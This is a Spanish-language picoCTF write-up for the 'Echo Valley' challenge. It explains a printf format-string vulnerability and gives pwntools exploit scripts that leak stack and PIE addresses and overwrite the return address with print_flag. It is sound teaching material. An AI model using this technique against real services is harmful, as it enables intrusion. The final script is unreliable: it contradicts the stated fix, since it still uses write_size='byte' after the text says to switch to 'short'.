# Echo Valley

En este ejercicio nos dan un binario y su respectivo código en C.

```c
./valley     
Welcome to the Echo Valley, Try Shouting: 
hola
You heard in the distance: hola
adios
You heard in the distance: adios
```

Parece ser un bucle en donde nos piden un input. Vamos a ver las protecciones que tiene el binario:

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Pleno! Tiene todo: PIE, NX, Canary y Full RELRO. Vamos a echarle un vistazo al código:

```c
void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf); // Vulnerabilidad de Format String
        fflush(stdout);
    }
    fflush(stdout);
}
```

Si miramos la función `echo_valley` podemos ver como efectivamente estamos en un bucle donde nos piden el input hasta que introduzcamos `exit`. Si nos fijamos en como se representa nuestro input en pantalla podemos ver como no está especificado el formato, con lo cual hay una vulnerabilidad de format string.

Vamos a probar a lanzar muchas `%p` a ver si hay algo curioso por el stack:

```c
./valley
Welcome to the Echo Valley, Try Shouting: 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
You heard in the distance: 0x7ffc611845c0 (nil) (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 0xc4d7f2c0ba99ee00 0x7ffc611847f0 0x55c3cf318413 0x1 0x7f471c81bca8 0x7ffc611848f0 0x55c3cf318401 0x1cf317040 0x7ffc61184908 0x7ffc61184908 0xde65293a6740c525 (nil) 0x7ffc61184918 0x7f471ca40000 0x55c3cf31ad78
```

Podemos ver algunas direcciones, si nos fijamos bien podemos ver alguna dirección interesante:

* En el puesto 20 del stack: `0x7ffc611847f0` (parece una dirección del stack)
* En el puesto 21 del stack: `0x55c3cf318413` (parece una dirección del programa)

A parte de eso podemos intentar ver si nuestro input está también:

```c
ABCDEF%p %p %p %p %p %p %p %p %p %p
You heard in the distance: ABCDEF0x7ffeb9742620 (nil) (nil) 0x560a17ab96d4 (nil) 0x7025464544434241
```

Y efectivamente está en la posición 6.

Vamos a investigar un poco mas que hay en la dirección del elemento 21 del stack

```c
You heard in the distance: 0x555555555413

   0x000055555555540e <+13>:      call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:      mov    eax,0x0
   0x0000555555555418 <+23>:      pop    rbp
```

Ajá! Esa dirección es la dirección siguiente a un call, lo que quiere decir que es la dirección de la dirección de retorno una vez estemos dentro de la función a la que se llama.

Como sabemos la dirección de una instrucción leakeada en el stack podemos calcular el offset de esa instrucción, y con el offset podemos luego en pwntools sacar la dirección del binario:

```c
piebase
Calculated VA from /home/ub1cu0/Desktop/picoCTF/Echo_Valley/valley = 0x555555554000

Offset de la Dirección de Retorno: 0x555555555413 - 0x555555554000 = 0x1413
```

La dirección del binario la calcularemos mas adelante cuando hagamos el script que resuelva el ejercicio.

La función `mtstr_payload` de pwntools permite modificar el valor de una variable en el stack, para usarla necesitamos 2 cosas:

* La posición de un parámetro controlable en el stack (LO TENEMOS)
* La dirección de la variable a modificar (AUN NO LO TENEMOS)

Nos queda averiguar cual es la dirección donde se guarda la dirección de retorno, que es la que tiene por valor la dirección en el puesto 21 del stack.

Vamos a usar el comando `telescope` para darle un vistazo a los elementos del stack:

```c
You heard in the distance: 0x7fffffffdca0

pwndbg> telescope $rsp 30
00:0000│ rsp 0x7fffffffdc20 ◂— 0x40
01:0008│-068 0x7fffffffdc28 ◂— 0xa
02:0010│-060 0x7fffffffdc30 ◂— 0x8000
03:0018│-058 0x7fffffffdc38 ◂— 0
04:0020│-050 0x7fffffffdc40 ◂— 0xb700000006
05:0028│-048 0x7fffffffdc48 ◂— 0
... ↓        7 skipped
0d:0068│-008 0x7fffffffdc88 —▸ 0x7ffff7fe4780 (dl_main) ◂— push rbp
0e:0070│ rbp 0x7fffffffdc90 —▸ 0x7fffffffdca0 ◂— 1
0f:0078│+008 0x7fffffffdc98 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
10:0080│+010 0x7fffffffdca0 ◂— 1 // Aquí
```

Ojo a esto! La dirección leakeada del stack corresponde a la dirección a 16 bytes del rbp. Entre la dirección de nuestro leak y la dirección del RBP hay una dirección entremedias. Ahora viene lo importante, que es esa dirección?

Cuando un programa en C llama a una función lo primero que sucede es un push del RIP y luego un push del RBP, sabiendo esto podemos saber que la dirección entre nuestro leak y el RBP es la `` dirección de retorno` `` o , lo que es lo mismo, la dirección de retorno es:

```c
dirección de nuestro leak del stack - 8 bytes
```

Ahora que ya sabemos la dirección de la variable que queremos sobrescribir podemos preparar el script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
piebase
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("shape-facility.picoctf.net", 49337)

    return r


def main():
    r = conn()

    offset_input = 6
    
    offset_piebase = 0x1413 # Calculo del offset
    info(f'Offset PIE base: {hex(offset_piebase)}')

    r.sendlineafter(b':', b'%20$p %21$p') # Conseguimos el leak de la posición 20 y 21 de la pila

    leaked_line = r.recvline_contains(b':').decode().strip()
    
    leaked_return_address = int(leaked_line.split()[-2], 16) - 0x8 # Calculo de la dirección de retorno
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    leaked_stack_address = int(leaked_line.split()[-1], 16)
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    info(f'Leaked Stack Address: {hex(leaked_stack_address)}')

    base_binario = leaked_stack_address - offset_piebase # Calculo de la base del binario, leak de la dirección menos el offset calculado
    info(f'Base del binario: {hex(base_binario)} ({hex(leaked_stack_address)} - {hex(offset_piebase)})')
    exe.address = base_binario # Indicamos a pwntools cual es la dirección del binario (esto sirve para poder usar la función symbols aunque haya PIE)
    valor = {leaked_return_address: exe.symbols.print_flag} # Diccionario que contiene DIRECCIÓN VARIABLE A MODIFICAR: NUEVO VALOR
    payload = fmtstr_payload(offset_input, valor, write_size='byte')
    r.sendline(payload)
    r.sendline('exit')  
    r.interactive()


if __name__ == "__main__":
    main()

```

Al ejecutar el script veremos que aunque nos saca correctamente los datos con los `infos` no nos devuelve la FLAG. Porqué pasa esto?

Si volvemos a mirar el código del programa podemos ver como la variable `buf` , donde está nuestro input, tiene un máximo de 100 bytes:

```c
char buf[100];
```

Vamos a comprobar cuantos bytes ocupa nuestro payload añadiendo la siguiente linea al código:

```python
info(f'Longitud Payload: {len(payload)}')
```

```c
[*] Longitud Payload: 120
```

Aquí está el problema, nuestro payload es demasiado grande y los últimos 20 bytes se omiten. Que podemos hacer para reducir el tamaño de nuestro payload?

Si nos fijamos bien, nuestra función `fmtstr_payload` necesita 3 parámetros, el ultimo de ellos controla el tamaño de las escrituras del payload.

Hay 3 tipos de tamaño de escritura para nuestra función:

* Byte
* Short
* Int

En el orden que he puesto, cuanto mas arriba, el payload ocupará mas espacio pero habrá mas precisión en las direcciones. Si usamos `short` tal vez de `byte` el tamaño del payload será menor pero su precisión también. Como es nuestra única alternativa vamos a intentarlo:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./valley")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("shape-facility.picoctf.net", 56161)

    return r


def main():
    r = conn()

    offset_input = 6
    
    offset_piebase = 0x1413 # Calculo del offset
    info(f'Offset PIE base: {hex(offset_piebase)}')

    r.sendlineafter(b':', b'%20$p %21$p') # Conseguimos el leak de la posición 20 y 21 de la pila

    leaked_line = r.recvline_contains(b':').decode().strip()
    
    leaked_return_address = int(leaked_line.split()[-2], 16) - 0x8 # Calculo de la dirección de retorno
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    leaked_stack_address = int(leaked_line.split()[-1], 16)
    info(f'Leaked Return Address: {hex(leaked_return_address)}')
    info(f'Leaked Stack Address: {hex(leaked_stack_address)}')

    base_binario = leaked_stack_address - offset_piebase # Calculo de la base del binario, leak de la dirección menos el offset calculado
    info(f'Base del binario: {hex(base_binario)} ({hex(leaked_stack_address)} - {hex(offset_piebase)})')
    exe.address = base_binario # Indicamos a pwntools cual es la dirección del binario (esto sirve para poder usar la función symbols aunque haya PIE)
    valor = {leaked_return_address: exe.symbols.print_flag} # Diccionario que contiene DIRECCIÓN VARIABLE A MODIFICAR: NUEVO VALOR
    payload = fmtstr_payload(offset_input, valor, write_size='byte')
    r.sendline(payload)
    info(f'Longitud Payload: {len(payload)}')
    r.sendline('exit')  
    r.interactive()


if __name__ == "__main__":
    main()
```

> Después de mandar el payload hay que mandar al programa la palabra `exit` por texto para que salga del bucle y así hacer que se termine la función.

```c
Congrats! Here is your flag: picoctf{SECRETO}
```

Tenemos la Flag!
